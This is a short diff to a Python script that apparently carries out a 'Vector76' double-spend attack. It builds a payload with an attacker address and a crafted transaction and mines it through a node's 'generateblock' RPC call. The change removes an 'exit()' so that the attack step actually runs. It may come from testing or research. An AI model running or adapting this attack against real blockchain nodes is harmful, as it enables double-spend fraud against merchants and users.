@@ -102,7 +102,6 @@ print("Mining Vector76 block...")
 payload = [attacker_address, [tx_vector76], False]
 print(f"Payload : {payload}")
 vector76_response = rpc_node.call("generateblock", attacker_address, [tx_vector76], False)
-exit()
 print(f"Mining Response : {vector76_response}")
 print()
 print("--------------------")
